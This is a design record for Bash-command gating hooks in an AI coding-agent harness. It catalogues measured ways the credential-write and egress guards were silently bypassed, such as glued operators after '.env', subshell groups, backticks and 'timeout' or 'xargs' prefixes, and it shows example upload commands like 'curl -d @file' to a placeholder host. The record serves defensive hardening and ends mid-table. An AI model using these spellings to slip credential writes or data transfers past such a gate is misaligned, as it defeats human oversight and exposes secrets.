# ADR: one authored control-operator splitter for both Bash gates, and why `&` is not always an operator

Status: accepted (plan `dfacff61-23d5-474e-846c-2e2f0f0ea482`, 2026-09-03)

## Context

Both hooks that read Bash text tokenize it with `shlex.split(cmd, comments=False,
posix=False)`. `posix=False` forces `whitespace_split=True`, so punctuation is not a
delimiter: an unquoted run of non-whitespace is ONE token whatever it carries. Two
measured tokenizations:

    shlex.split('foo > src/log.txt; bar', posix=False)  -> ['foo', '>', 'src/log.txt;', 'bar']
    shlex.split('foo 2>/dev/null; bar', posix=False)    -> ['foo', '2>/dev/null;', 'bar']

A control operator written with no space in front of it therefore stays glued to the token
before it, with three consequences.

**1. Every extracted VALUE was corrupted.** Each consumer takes the raw token text:
`redir_target` (`hooks/scripts/writ-bash-write-gate.sh:1085-1086`, `if rest: return
rest`), `tee` arguments (`:1340`), `dd of=` (`:1342`), `cp`/`mv`/`install` destination and
`-t DIR` (`:1357`, `:1361`), `sed -i` (`:1366`), and the egress positionals via
`strip_redirs` (`:914`). All line numbers are pre-change.

**2. The credential guard was DEFEATED, and it returned ALLOW with no signal.**
`writ.session.gates._is_credential_path` is basename-driven, and `.env;`, `.env&&`,
`.env|`, `id_rsa;` and `key.pem;` are not credential basenames. Measured end to end
through the real hook, in work mode with BOTH work gates approved: `echo x > .env ; ls`
denies with `[SEC-CREDENTIAL-WRITE]`, while `echo x > .env; ls` and `echo x > .env&& ls`
were allowed silently. Bash writes `.env` in every one of those spellings, so the gate
judged a path the OS never touches. That is an organization-level boundary ("never read or
write credential files") turned off by one missing space.

**3. The command AFTER the operator was invisible.** Because the operator never became a
token, `CONTROL` (`:628`) never matched, the segmentation loop never split, and the
following command stayed a trailing argument of the previous segment. `verb_at`
(`:770-837`) inspects `seg[0]` only, so it could never see it: a glued separator in front
of `curl -d @file https://host` lost the egress row entirely. The same mechanism sits in
`hooks/scripts/writ-worktree-safety.sh`, where it hid a real `git worktree add`.

The corrupted values and the lost segmentation are the SAME defect seen from two ends.
Patching the six consumers to strip trailing punctuation would have fixed the values while
leaving the invisible-command half wide open.

**The category was disclosed while this instance was not.** `writ-bash-write-gate.sh:41-45`
named "glued `foo>bar`" in its COVERAGE LIMIT, and `:89-93` named "glued forms the
tokenizer does not split", so a reader of either passage would have concluded that gluing
was a known accepted limit rather than a live credential-guard bypass. Both passages are
CORRECTED by this cycle rather than left standing: the write block now states the
mechanism, the measured allow-to-deny flip, and exactly what remains in that family, and
the egress clause now points at the write block and says that this member is fixed.

## Decision

One authored source, `writ/session/bash_tokens.py`, exporting

    split_control_operators(tokens: list[str]) -> list[str]

which re-splits each token so every control operator (`;`, `&&`, `&`, `|`, `||`) is its
own token. Pure, total, no I/O, raises for no input, idempotent, and it imports nothing at
all so it loads under `python -S` and is safe to paste inline.

It is called EXACTLY ONCE per hook invocation, on the full token list, between
`shlex.split` and the segmentation loop. Nothing downstream changes: the redirect loop,
the `cmd0` write arms, the inline-interpreter scan and the egress pass all see the same
corrected stream.

Both hooks IMPORT it, and both carry its marker-delimited block inline as a mirror. This
follows the precedent in the very file being fixed: `_is_credential_path` is imported from
`writ.session.gates` with "SINGLE SOURCE, no drift" plus a minimal inline fallback used
only if the package import fails (`writ-bash-write-gate.sh:563-592`).

Reachability was VERIFIED rather than assumed, and the answer for the worktree hook was
"not as written". It invoked its embedded python as `WRIT_WT_CMD="$CMD" python3 <<'PY'`,
passing no `WRIT_DIR` and doing no `sys.path` manipulation, so the package was unreachable
from there. It becomes reachable with exactly the two lines the write gate already has:
`WRIT_DIR="$WRIT_DIR"` on the invocation and `sys.path.insert(0, os.environ.get("WRIT_DIR",
""))` inside. `WRIT_DIR` is computed identically in both hooks, so this is a two-line
change to an already-proven pattern.

**The mirror is PROVED, not trusted, and the measurement is why that matters.** The hooks
run `python3`, the SYSTEM interpreter, which has no install of this package, so under the
real hook the import succeeds only through the `sys.path` insert. The test suite runs
under `.venv/bin/python`, which carries an EDITABLE install
(`.venv/lib/python3.12/site-packages/__editable___claude_writ_1_5_0_finder.py`, whose
`MAPPING` points `writ` at this repo), so `import writ` succeeds there regardless of
`WRIT_DIR` and the suite ALWAYS exercises the package copy. A hand-written fallback would
therefore never be executed by any test. So:

- each copy sits between `# MIRROR BEGIN split_control_operators` and
  `# MIRROR END split_control_operators`, at top level, with the module's indentation;
- the import that FOLLOWS the mirror rebinds the name, so the package copy is
  authoritative whenever it resolves;
- `tests/test_bash_control_operator_split.py` asserts the three blocks are textually
  identical AND `exec`s each hook's block and compares its token stream against the
  package function on every matrix and trap input;
- a POSITIVE reachability signal exists (`TestThePackageCopyIsTheOneThatRuns`) because the
  mirror makes a failed import behave identically, so no verdict can tell you whether the
  import resolved. The probe runs `python -S -E` with `cwd` outside the repo, asserts the
  import succeeds with `WRIT_DIR` set and FAILS with it empty.

### The trap: `&` is not always a control operator

A bare `&` backgrounds, but `&` also appears INSIDE a redirect as a file-descriptor
duplicate (`2>&1`, `>&2`, `<&3`), and `&>` is itself a redirect operator. Splitting `&`
unconditionally would break `2>&1` into pieces and change how every redirect is read.
Measured before the fix: `foo >/dev/null 2>&1; bar` yields NO target, because
`redir_target` sees `rest` starting with `&` and returns None for the fd-dup, which
happens to swallow the trailing `;` harmlessly. The fix must keep that at NO target while
still splitting the `;`, so the splitter tracks whether the character it is looking at
follows a redirect operator within the same token:

- `>`, `>>`, `>|` and a run of `<` set an "after a redirect operator" flag;
- an `&` while that flag is set is kept in the token, so `2>&1` stays one token;
- an `&` immediately followed by `>` is the `&>` redirect operator, so it opens a NEW
  token rather than becoming an operator token, which is how bash lexes it;
- otherwise `&&` is matched before `&`, and `||` before `|`.

A fix that segments correctly and invents a `&1` target has traded one defect for another,
so both halves are pinned in both spellings: `2>&1` produces no target glued or spaced,
AND the write target of the command after the glued separator IS produced.

Quoted spans are never split. That is what preserves `> "src/log.txt";` (correct today,
because shlex ends a token at a closing quote even with no following whitespace) and what
keeps `sed -i -e 's/a/b/;s/c/d/' f` a single argument. A backslash escapes the next
character for the same reason.

`>` is deliberately NOT a boundary. `foo>src/x.py`, an operator glued to the verb IN FRONT
of it, is a different mechanism with no token boundary to recover, and it stays disclosed
rather than half-fixed. The one member of that family that becomes visible is the `&>`
spelling (`foo&>src/x.py`), because an `&` in that position can only start a redirect.

### Where the module lives

`writ/session/bash_tokens.py`, beside `gates.py`, the other hook-shared classifier, so one
`sys.path` insert serves both imports; `writ/session/__init__.py` is a docstring only, so
the import costs no package initialization on the hook hot path.

## Alternatives considered

1. **Two hand-authored inline copies, one per hook.** Rejected: that is the door
   divergence the last two cycles were about, and one fixed copy with one broken copy is
   the exact failure mode. The mirror keeps the hooks self-sufficient without making them
   independent authors, and the identity plus equivalence tests make drift impossible to
   ship silently.
2. **Package import with NO fallback.** Rejected in both directions. Failing OPEN on a
   failed import silently restores the defect, which is the thing being fixed; failing
   CLOSED makes the hook refuse every redirect in the repo on an infrastructure fault, and
   a refusal with no named action is a deadlock this repo has already shipped once.
3. **Splitting `&` unconditionally.** Rejected on the measured `2>&1` behavior above: it
   would break every fd-dup redirect and could invent a `&1` write target.
4. **Making `>` a boundary too.** Rejected as a separate mechanism whose blast radius is
   not justified by this cycle's evidence: it would cut inside `[[ ]]`/`[ ]`/`(( ))`
   comparison and arithmetic spans and inside every unquoted argument that merely contains
   `>`. `foo>bar` stays disclosed in both hook headers.
5. **`writ/shared/` as the module's home.** Rejected because `writ/shared/tokens.py`
   already means LLM token accounting, and a `bash_tokens.py` beside it invites the wrong
   reading.

## Consequences

**Newly gated for ordinary writes, and AT THE TIME STILL A MISS FOR SECRETS.** Splitting inside a
token also splits the body of an unquoted command substitution or a paren group: `(cd x; cp
a src/y.py)` tokenizes as `['(cd', 'x;', 'cp', 'a', 'src/y.py)']` and now segments, so the
`cp` destination is extracted as `src/y.py)` with a stray paren, where before the fix it
produced no target, no gate call and no audit row. For an ordinary path that reads as a net
gain with a cosmetically wrong character, and the cycle O amendment below records the
measurement that refutes the word "cosmetically": a stray `)` also defeats the NONFILE
exact-string set, so `(echo x > /dev/null)` emitted `('outside', '/dev/null)')` and every
`(cmd > /dev/null)` was work-gated.

CALLING IT COSMETIC WAS FALSE FOR A CREDENTIAL PATH, and the measurement said so. Group
constructs defeated the credential guard by TWO separate mechanisms, both present before
this cycle and both still present after it (verified by reverting). BOTH ARE CLOSED by the
cycle O amendment below; the measurements are kept because they are the evidence that
amendment rests on:

- The VERB carries the group character, so no arm matches and there is NO ROW AT ALL.
  Measured through the extractor: `(cp seed.txt src/y.py)` and `( cp seed.txt src/y.py)`
  and `{ cp seed.txt src/y.py; }` each yield the empty set, because `seg[0]` is `(cp`, `(`
  or `{` and `verb_at` resolves none of them to `cp`.
- The REDIRECT path does not consult the verb, so a redirect inside a group IS seen, but
  its target keeps the trailing `)` and the basename-driven classifier misses it the same
  way it missed `.env;`. Same class as the defect this cycle fixed, spelled with `)`
  instead of `;`.

End to end through the real hook, work mode, BOTH gates approved: `cp seed.txt <secret>`
denies with `[SEC-CREDENTIAL-WRITE]`, while `(cp seed.txt <secret>)` and
`(echo x > <secret>)` are ALLOWED SILENTLY. So a credential write is still hidden by
wrapping it in a group, and this cycle did not change that either way.

CORRECTED IN THE CYCLE O AMENDMENT BELOW, not here. This cycle deliberately stopped at the
tokenizer: trailing-punctuation stripping per consumer is the patching this design
replaced, and hardening the classifier against malformed input would treat the symptom.
The amendment keeps both of those rejections and closes the hole in the two places the
mechanisms actually live: verb resolution, and one normalization point ahead of
classification.

**Residue that stays open, so the fix is not read as wider than it is.**

- `foo>src/x.py`, the operator glued to the verb in front of it.
- A shell KEYWORD or a GROUP OPENER in verb position. Open when this ADR was written,
  CLOSED by the cycle O amendment below; the residue that remains is enumerated there
  (a substitution inside an assignment, a `case` branch's first command, and a function
  definition body).
- The NEWLINE separator in the write gate. MEASURED this cycle rather than read: through
  the hook's own embedded extractor, `WRIT_BASH_CMD="ls\ncp seed.txt src/x.py"` with
  `WRIT_CWD=/proj` emits NO row, while the `;`-separated control `"ls ; cp seed.txt
  src/x.py"` emits `local /proj/src/x.py`. `shlex` discards newlines, so `CONTROL`'s `"\n"`
  member matches nothing and a multi-line command is judged as ONE segment whose verb is
  the first line's. `writ-worktree-safety.sh` pre-splits newlines outside quotes and strips
  heredoc bodies for exactly this reason; the write gate does neither, and porting it needs
  the heredoc stripper too, or a document ABOUT a write becomes a refusal. Deferred to its
  own cycle and disclosed in the header rather than bolted on here. CLOSED by the cycle R
  amendment below, which found that porting the worktree hook's helpers VERBATIM would have
  been a net loss: the stripper's own two defects are recorded there.

**The splitter runs AFTER heredoc-body stripping**, on purpose, so a body line is never
re-split and can never contribute a segment. That ordering is what keeps
`cat <<'EOF' ... git worktree add ... EOF` from becoming a refusal. As of cycle R it holds
in BOTH hooks, because the pre-split and the stripper are members of the shared mirror
block rather than one hook's private helpers, so the ordering is a property of the block
and not of a single call site. What the ordering does NOT buy: an opener GLUED to what
follows it (`cat <<'EOF'>f`) is not recognized as an opener at all, because stripping runs
on the RAW shlex tokens, ahead of the splitter that would have separated them.

**What is NOT proven.** The classifier (`gates._is_credential_path`), the embedded
extractor's rows and the real hook's `permissionDecision` were all measured. A write
LANDING ON DISK through the full Claude Code path was NOT verified. "Bash writes `.env` in
every case" is shell semantics, not an observation of a file appearing on this machine, and
no test in this cycle opens or creates a credential file (organization credential ban).
Nothing here proves any behavior of the tokenizer under a Claude Code envelope shape that
the synthetic envelopes in the test harness do not reproduce.

## Amendment (cycle O): group constructs in verb position

The residue this ADR left open ("a shell KEYWORD in verb position") and the miss it
disclosed but did not fix ("the credential guard is defeated by a paren today") are both
CLOSED here. The tokenizer is untouched: nothing about `split_control_operators`,
segmentation or quoting changed. What changed is which token is called the verb, and what
one loop does to a value before classifying it.

### The two mechanisms, as measured

MEASURED through the write gate's own embedded extractor with `WRIT_CWD=/proj`, before the
fix:

```
cp seed.txt src/y.py                        -> {('local', '/proj/src/y.py')}   (control)
(cp seed.txt src/y.py)                      -> set()
( cp seed.txt src/y.py)                     -> set()
( cp seed.txt src/y.py )                    -> set()
{ cp seed.txt src/y.py; }                   -> set()
$(cp seed.txt src/y.py)                     -> set()
`cp seed.txt src/y.py`                      -> set()
if true; then cp seed.txt src/y.py; fi      -> set()
while true; do cp seed.txt src/y.py; done   -> set()
(echo x > src/y.py)                         -> {('local', '/proj/src/y.py)')}
(echo x > /dev/null)                        -> {('outside', '/dev/null)')}
( echo x | tee src/y.py )                   -> {('local', '/proj/src/y.py'),
                                                ('local', '/proj/)')}
```

1. NO ROW AT ALL. `verb_at` stepped over a prefix only by membership in `WRAPPERS`, so a
   group character occupying verb position (`(`, `{`) or glued to it (`(cp`, `$(cp`,
   `` `cp ``) became "the verb" and matched none of the `cmd0` write arms. Reserved words
   failed for a second reason: the `;` split isolates `then` and `do` ALONE in `seg[0]`,
   and neither is in `WRAPPERS`.
2. A CORRUPTED VALUE, COSTING IN BOTH DIRECTIONS. The redirect path never consults the
   verb, so a redirect inside a group WAS seen, with the group's trailing closer still on
   its target. `src/y.py)` defeats the basename-driven credential classifier exactly as
   `.env;` did, and `/dev/null)` defeats the `NONFILE` exact-string set, which made every
   ordinary `(cmd > /dev/null)` work-gated. The missed secret and the refused chore are the
   same corrupted value read by two different arms.

End to end through the real hook, work mode, BOTH gates approved: `cp seed.txt <secret>`
denied with `[SEC-CREDENTIAL-WRITE]` while `(cp seed.txt <secret>)` and
`(echo x > <secret>)` were ALLOWED SILENTLY.

### Decision

`writ/session/bash_tokens.py` gains `GROUP_VERB_TOKENS`, `GROUP_OPENER_PREFIXES`,
`ARITH_OPENERS`, `GROUP_CLOSER_TOKENS`, `strip_group_opener` and
`strip_unbalanced_close`, INSIDE the existing `# MIRROR BEGIN/END
split_control_operators` block, so the two hooks share one authored source and the
existing textual-identity test catches drift. The marker strings keep their spelling (they
are what `tests/test_bash_control_operator_split.py` slices on); a comment inside the block
records that the name is now historical and the block carries every shared bash-token
helper.

- Both hooks' `verb_at` loops step over a token that is in `GROUP_VERB_TOKENS` after
  `strip_group_opener` has removed a glued opener. The two `verb_at` BODIES stay separate,
  because the write gate parses sudo/doas short-option grammar strictly while the worktree
  hook only answers "is the verb git"; the shared thing is the stepping vocabulary, not the
  function.
- The write gate applies `strip_unbalanced_close` at ONE place, the head of the
  classification loop, which is downstream of every collection vector (the redirect loop,
  the six `cmd0` arms, the inline-interpreter pass) and upstream of every judgement
  (`NONFILE`, the credential classifier, the gate-state realpath, the `seen` dedup, the
  abspath and the local/outside split). The worktree hook applies it at the ONE place a
  `target` is assigned.
- A closer standing ALONE on its own token is dropped where SEGMENTS are built, in both
  hooks, and it is not a normalization case at all. See "The bare closer" below.

### The stepping set, member by member

IN: `(` and `{` (group openers, a command list follows directly); `then`, `do`, `else`
(reserved words a command list follows directly); `if`, `elif`, `while`, `until` (what
follows is a CONDITION, which is itself a command list that really runs, as in `if cp seed.txt
.env; then :; fi` executes the `cp`); `!` (pipeline negation).

OUT, each for a stated reason:

- `[`, `[[`, `test`: LOAD-BEARING exclusion. These ARE the verb, and the write gate
  suppresses redirects for a segment whose verb is one of them (`seg_is_test`). Stepping
  over `[[` would make `"$x"` the verb, un-suppress the span, and read
  `if [[ "$x" > "config.txt" ]]; then echo hi; fi` as a write to `config.txt`.
- `((`, `$((`: arithmetic, not a group. The extractor counts the LITERAL substrings `((`
  and `))` as a depth counter, which owns that spelling, so `strip_group_opener` returns
  such a token unchanged.
- `for`, `select`, `case`, `in`: what follows is a VARIABLE NAME or a WORD, not a command,
  so stepping would resolve a WRONG verb rather than recover a hidden one. A loop BODY is
  still covered, because `do` is in the set.
- `fi`, `done`, `esac`, `}`, `)`: closers; nothing follows them inside their segment.
- `coproc`, `function`: both take an OPTIONAL NAME before the command, and an optional
  name is not distinguishable from the command itself, so stepping over it resolves a
  WRONG verb as often as it recovers a hidden one. This reason stands on its own. It was
  originally given by analogy ("the same reason `timeout`, `stdbuf`, `nice`, `setsid`,
  `xargs` and `watch` are absent from `WRAPPERS`"), and that analogy is dead: the cycle P
  amendment below made all six `WRAPPERS` entries. The distinction that survives is
  SHAPE. `timeout`'s one positional is a DURATION, which has a checkable shape, so it can
  be stepped conditionally; an optional name has no shape at all.

### Three glued prefixes, and why the two substitution syntaxes are one case

`GROUP_OPENER_PREFIXES = ("$(", "(", "`")`. All three were MEASURED silent (see the table
above), which is the evidence that made them one case rather than a subshell fix plus a
guess. The backtick is the older command-substitution spelling; bash runs the substitution
and the `cp` inside it executes either way, so resolving the substitution's first word as
the verb is correct semantics, and it can only ADD rows when that word is one of the write
arms. Leaving it out would have been a one-character bypass of this fix.

`{` is deliberately NOT in the tuple, and the reason is EXECUTED rather than read:
`bash -c '{echo hi; }'` is a syntax error (`syntax error near unexpected token `}'`) while
`bash -c '{ echo hi; }'` prints `hi`. A glued `{` does not merely fail to open a group, it
does not parse at all, so the spelling cannot be a bypass vector and stripping it would
invent a verb for a command bash refuses to run. The bare `{` is in `GROUP_VERB_TOKENS`
instead.

RETRACTED, because the first pass at this decision got it wrong and the reason should not
survive in the record: the backtick was initially left out on the argument that "unbalanced
trailing" is undefined for a character that is its own closer. Parity expresses it fine, so
the argument was wrong rather than merely cautious.

### Two counting rules, never `rstrip`

`strip_unbalanced_close` is COUNTED, with one rule per closing character:

- `)` comes off only while the token holds MORE `)` than `(`, which is what a group closer
  looks like from inside the token that ended the group. `src/note(1))` therefore becomes
  `src/note(1)`, where `rstrip(")")` would have produced `src/note(1`.
- a BACKTICK is its own closer, so "more closers than openers" is undefined for it and the
  rule is PARITY: a trailing backtick comes off only while the token's backtick count is
  ODD. `` src/y.py` `` becomes `src/y.py`, and `` src/a`b`.txt `` is untouched.

It never returns the empty string: a one-character token is left alone, because `""` is a
`NONFILE` member and turning a target into a `NONFILE` member would DELETE a row that
exists today rather than correct it.

`}` needs no rule: bash requires a `;` or `&` before a brace group's `}`, and the splitter
already makes that boundary, so `{ cp seed.txt src/y.py; }` yields a clean token.

### The bare closer, which is SYNTAX and not a value

A fully spaced subshell puts the closer on its OWN token, and a bare `)` is a valid
positional argument to every write arm: the `cp`/`mv`/`install` destination is `cand[-1]`
and the `sed -i` file is `files[-1]`, both filtered only on "not a flag and not a
redirect", and the `tee` loop takes any non-flag argument. So `( cp seed.txt src/y.py )`
would have resolved the DESTINATION to `)`, which is a phantom target AND a lost real one:
the fix would have traded the blind spot for a worse defect. The same shape was already
live before this cycle on the arm that needs no verb, measured: `( echo x | tee src/y.py )`
emitted the phantom row `('local', '/proj/)')` beside the real target.

`strip_unbalanced_close` cannot answer it, structurally: the bare token IS the closer, so
stripping would yield `""`, which the "never empty" rule forbids for a reason. The token is
therefore dropped where SEGMENTS are built, in both hooks, as one more thing that is not a
command word, in the same place and the same shape as the existing `CONTROL` check, one line
beside it. `GROUP_CLOSER_TOKENS` holds `)` only: `]`, `]]` and `))` are COUNTED by the
comparison and arithmetic suppression, so dropping them would un-suppress those spans, and
a lone `}` never shares a segment with a write.

### Alternatives rejected

1. **Making `(` or `)` a token boundary in `split_control_operators`.** The obvious fix and
   the one the next reader will reach for. It would break three things that work today:
   the arithmetic depth counter (it counts the LITERAL `((` and `))` inside ONE token, so
   it REQUIRES them glued); the process-substitution guard `if rest.startswith("("):
   return None` inside `redir_target` (splitting `>(cmd)` would make the `>` look like it
   targets a bare `(`); and `$(...)`, which would be blown open into unrelated top-level
   segments. This amendment touches neither the splitter's behavior nor segmentation.
2. **Per-consumer trailing-punctuation stripping.** Rejected again, for the same reason
   this ADR rejected it: it is the patching the single re-split replaced, and it would put
   the same rule in nine places that already agree on one list.
3. **A second shared module beside `bash_tokens.py`.** Rejected: the mirror block already
   exists, is already asserted byte-identical across three files, and a second sharing
   mechanism would need its own drift test.
4. **Normalizing egress hosts.** Rejected: egress destinations have no single collection
   list to normalize at, and the direction of the error is fail-closed, because an
   unmatched allowlist entry can only ADD a confirmation prompt, never remove one.
   `(curl -d @f https://example.invalid)` now asks, with the host carrying a cosmetic `)`.

### Accepted cost

A file whose name really ends in an UNBALANCED `)` is gated under the name without it
(`cp a 'src/weird)'` records `src/weird`). The direction is fail-closed: the row still
exists, and a credential named `.env)` normalizes INTO a deny rather than out of one. A
test pins it so it is documented behavior rather than a surprise.

The BOUNDARY direction is safe for a structural reason worth stating, because it is the
other half of the verdict: normalization can only SHORTEN a path, and a shorter path cannot
become contained in a root that did not contain the longer one, so a target outside the
project cannot normalize its way inside. Measured across the cases the test pins:
`/etc/foo)` normalizes to `/etc/foo` and stays out of project; `.env)` becomes a credential
where it was not one; a balanced `src/note(1)` is untouched; and a lone `)` returns itself
rather than the empty string, which would have deleted the row instead of correcting it.

One live behavior LOOSENS, and it is the correct one: `(echo x > /dev/null)` goes from the
row `outside /dev/null)` to NO row. That row only ever existed by corruption; the
uncorrected `/dev/null` is a `NONFILE` member and has never produced one.

### Residue that stays open

- A substitution inside an ASSIGNMENT: `out=$(cp a src/y.py)` matches `ASSIGNMENT` on
  `out=$(cp`, so `verb_at` steps the whole token and resolves `a` as the verb.
- The FIRST command of a `case` branch: `case $x in a) cp a src/y.py;; esac` leaves `a)` in
  verb position, and stepping over it needs pattern-list parsing.
- A FUNCTION DEFINITION body: `f() { cp a src/x.py; }` resolves its verb to `f()`. Out of
  scope rather than missed, because the body writes only when the function is CALLED, and
  the call resolves to the verb `f`, which is the already-disclosed wrapper-script limit.
- `foo>src/x.py`, unchanged and still disclosed in that hook's header. The NEWLINE
  separator was listed here too, and it is CLOSED by the cycle R amendment below.

### Measured versus inferred

MEASURED: every extractor row in the table above and its after-state counterpart; the real
write-gate hook's `permissionDecision` in work mode with both gates approved, for the
ungrouped control and for each group spelling; the real worktree hook's decision for the
three grouped `git worktree add` forms and for a gitignored target inside a group; the
egress row for a transfer verb inside a subshell; and the four bash grammar probes,
including the `{echo hi; }` syntax error.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path.
"Bash writes the file in every one of these spellings" is shell semantics, not an
observation of a file appearing on this machine. No test in this cycle creates, opens or
reads a credential file; the classifier is path-only (organization credential ban).

## Amendment (cycle P): six wrapper prefixes, and one reason that was false

Same seam, fourth instance, and the same single function. `verb_at` stepped over a command
prefix only by membership in `WRAPPERS`, so `xargs`, `timeout`, `nice`, `stdbuf`, `watch`
and `setsid` became `cmd0` themselves and the real command was never resolved. Because
`verb_at` is the single source for the write pass, the egress pass and the interpreter
pass, each prefix hid a write AND a data transfer.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
ls | xargs cp -t src                  -> set()
ls | xargs -I{} cp {} src/y.py        -> set()
timeout 5 cp seed.txt src/y.py        -> set()
nice -n 5 cp seed.txt src/y.py        -> set()
stdbuf -oL cp seed.txt src/y.py       -> set()
watch -n1 cp seed.txt src/y.py        -> set()
setsid cp seed.txt src/y.py           -> set()

ls | xargs curl -d @src/a.txt https://example.invalid  -> set()
timeout 5 curl -d @src/a.txt https://example.invalid   -> set()
setsid curl -d @src/a.txt https://example.invalid      -> set()

sudo cp seed.txt src/y.py             -> local /proj/src/y.py   (control)
env FOO=1 cp seed.txt src/y.py        -> local /proj/src/y.py   (control)
```

The obstacle the header had recorded ("each takes non-flag positional arguments of its own
before the command and a naive skip would mis-read the verb") was true of exactly ONE of
the six.

### Decision: STRICT tables, not PERMISSIVE skipping

All six entries carry BOTH a value-flag set and a no-value-flag set. `WRAPPERS` already
supported that arm for `sudo` and `doas`, and `verb_at` already parsed bundled shorts, a
value glued to its letter, the `--flag=value` long form, the spaced form, and `--` as end
of options.

Alternative rejected: PERMISSIVE (`None` second element, as `command` / `env` / `exec` /
`nohup` / `time` use). It skips any dash token, which handles a glued value by accident,
but it reads a SPACED value of an UNKNOWN flag as the verb. STRICT bails to
`("", len(seg), [])` instead. The trade is identical in all six entries: a mis-classified
or unknown flag costs a MISS, never a prompt naming the wrong command. Fail-closed for the
verb, fail-open for detection. A bailed segment's plain redirects are still extracted,
because the redirect loop never consults the verb.

Per-entry decisions and what each trades:

- `setsid`: no value-taking flag at all, so nothing can be mis-placed.
- `stdbuf`: all three real flags take a value, and the measured `-oL` resolves through the
  existing glued-short branch, so no new parsing shape appears.
- `nice`: `-n` takes a value; bare `nice cp` needs no positional step, because the flag
  loop breaks on the first non-dash token. ACCEPTED MISS: the obsolete `nice -5 cmd`
  spelling is an unknown option letter and bails. Handling it would mean treating a
  numeric option letter as an adjustment, a second parsing shape for one deprecated
  spelling.
- `watch`: `-n/--interval` and `-q/--equexit` take values.
  `--differences[=permanent]` is listed NOVALUE on purpose, because an optional long value
  must be glued with `=` and the long branch checks the no-value set first.
- `xargs`: several value-taking flags including the measured glued `-I{}`, `-n1` and `-P4`.
  ACCEPTED MISS: GNU's optional-argument shorts (`-e`, `-i`, `-l`) are listed NOVALUE, so
  the common `xargs -i cp {} src/y.py` resolves `cp` while the glued `xargs -iX cp ...`
  hits an unknown letter and bails.
- `timeout`: `-s` and `-k` take values, plus the one genuine positional below.

### The positional, and why it is a side table

`timeout DURATION COMMAND` is the only positional among the thirteen wrappers. Rather than
widen the `WRAPPERS` tuple to a third element and touch twelve untouched entries, it is a
one-line side table plus a shape check:

```python
WRAPPER_POSITIONALS = {"timeout": 1}
DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")
```

stepped immediately after the wrapper's flag loop. Placement there is what makes every
spelling work: the loop exits by `break` on the first non-dash token (`timeout 5 cp`), or
on `--` (`timeout -- 5 cp`), or after consuming a value (`timeout -s KILL 5 cp`,
`timeout -k 1 5 cp`), and the step runs in all four cases. A bail inside the flag loop
returns from `verb_at` outright, so the step is never reached with an unclassified option,
and `.get(name, 0)` is 0 for the other twelve wrappers, so no existing prefix changes
behavior by one token.

The step is SHAPE-CHECKED, not blind, and that is load-bearing. A token that does not look
like a duration is NOT skipped and becomes the verb, so `timeout cp seed.txt src/y.py`
still resolves `cp`. The only command that lands in the unchecked branch is one `timeout`
itself rejects, so the cost of the check is at worst an extra row for a command that never
runs, never a lost row for one that does.

### The false reason, which is the amendment's second half

The write gate's inline-interpreter note said `sh -c` and `bash -c` are not covered
because "their body is shell, already parsed by the vectors above". MEASURED, that is
false in every quoted spelling: `bash -c "echo x > src/y.py"`,
`bash -c "cp seed.txt src/y.py"`, `bash -c "echo x | tee src/y.py"`,
`sh -c "echo x > src/y.py"` and `bash -c 'echo x > src/y.py'` all emit the empty set,
because the body is ONE token and a token beginning with a quote character never matches
`REDIR`. Only the unquoted `bash -c echo x > src/y.py` is seen, and it is seen because at
that point the redirect belongs to the OUTER command.

The BEHAVIOR of `sh -c`, `bash -c` and `eval` is deliberately unchanged. The reason on the
record is now the real one: the false-positive cost of gating every `bash -c`. A
disclosure that misstates WHY a hole is open is worse than one that admits it, because it
stops the next reader re-examining it. That is what happened here: the wrong reason
survived long enough to be quoted in three other documents as a bare list item.

### Deferred, each for a stated reason

- `find -exec` / `-execdir`. A DIFFERENT MECHANISM: the nested command sits inside an
  argument list with a terminator (`\;`, `';'` or `+`), not in front of the command, so no
  prefix step can reach it. All four spellings were measured silent, and the four silences
  are pinned as tests so the deferral is visible rather than assumed. (This deferral is
  CLOSED by the cycle Q amendment below, which also records that the family is four flags
  and not two: `-ok` and `-okdir` were silent too and were named nowhere here.)
- DELETION. `rm` and `rm -rf` remain out of scope for this gate by recorded ruling, so
  `find . | xargs rm` STAYS silent after the fix. Pinned, so the prefix closure is not
  read as smuggling deletion into scope.
- The worktree gate's own `WRAPPERS`. Prose corrected, code untouched: its parsing is
  permissive-only by design, it has no positional mechanism, and `timeout 5 git worktree
  remove x` evading it is INFERRED from the code rather than measured. Growing it would be
  a second unmeasured change in a module this cycle had no evidence about.
- Further transparent prefixes with no table yet (`ionice`, `chrt`, `flock`, `unbuffer`,
  `script`, `parallel`, `su -c`, `strace`). Each is a table away, not a mechanism away.

### The residue is machine-readable now

The write gate's header used to name the still-uncovered prefixes in prose, and the test
that ratcheted it matched substrings. After the fix those substrings all still appear in
the file as `WRAPPERS` keys, so the pin would have passed VACUOUSLY rather than gone red.
The header now carries a names-only block between `# UNCOVERED PREFIXES BEGIN` and
`# UNCOVERED PREFIXES END`, with every reason in the prose ABOVE it, and the test derives
both sides: the block must be non-empty, must name `find -exec` and `find -execdir`, and
must be DISJOINT from the hook's own `WRAPPERS` keys. Naming a covered prefix as
uncovered, and closing a prefix without updating the block, now both redden.

### Measured versus inferred

MEASURED: the ten extractor rows above and the two controls; each of the six flag tables
against the installed binary's own `--help` (coreutils 9.4, util-linux 2.39.3, findutils
4.9.0, procps-ng 4.0.4); `xargs --max-lines` taking an OPTIONAL argument, executed rather
than read off `--help`, which prints it as though required; the six quoted `sh -c` /
`bash -c` spellings; all four `find -exec` spellings; and the real write-gate hook's
`permissionDecision` for one prefixed egress command (`timeout 5 curl ...` asks and names
the host).

NOT MEASURED, stated plainly: the real hook's `permissionDecision` for the seven prefixed
write rows and the other two prefixed egress rows, which are proved at the extractor layer
only; and a write LANDING ON DISK through the full Claude Code path, which a PreToolUse
hook test cannot show at all and which is therefore left unclaimed. INFERRED, not
measured: `timeout 5 git worktree remove x` evading the worktree gate by the same
mechanism.

## Amendment (cycle Q): a nested command inside an argument list

Same seam, fifth instance, and this time the prefix mechanism could not reach it at all.
find's exec family carries a whole command as ARGUMENTS, ended by one of find's own
terminator tokens. `verb_at` returns ONE verb per segment and returns at the first
non-`WRAPPERS` name, so `cmd0` for the whole segment was `find`, which matches none of the
four write arms and none of `EGRESS_VERBS`. The nested command produced no target, reached
no gate and left no audit row.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
find . -name x -exec cp {} src/y.py \;                              -> set()
